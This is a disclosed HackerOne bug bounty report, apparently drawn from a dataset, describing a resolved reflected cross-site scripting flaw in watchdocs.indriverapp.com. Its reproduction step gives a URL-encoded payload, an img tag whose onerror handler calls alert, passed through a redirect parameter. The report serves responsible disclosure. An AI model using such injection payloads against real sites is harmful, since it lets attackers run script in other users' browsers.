---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2014955'
original_report_id: '2014955'
title: '#1 XSS on watchdocs.indriverapp.com'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: indrive
created_at: '2023-06-06T17:18:15.380Z'
disclosed_at: '2024-04-11T09:01:27.222Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 119
asset_identifier: '*.indriverapp.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# #1 XSS on watchdocs.indriverapp.com

## Metadata

- HackerOne Report ID: 2014955
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: indrive
- Disclosed At: 2024-04-11T09:01:27.222Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
XSS on watchdocs.indriverapp.com

## Steps To Reproduce:

  1. Go to https://watchdocs.indriverapp.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1)%3E
  2. An alert window will popup
  




{F2401964}

## Impact

Allow executing js code on users browsers

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
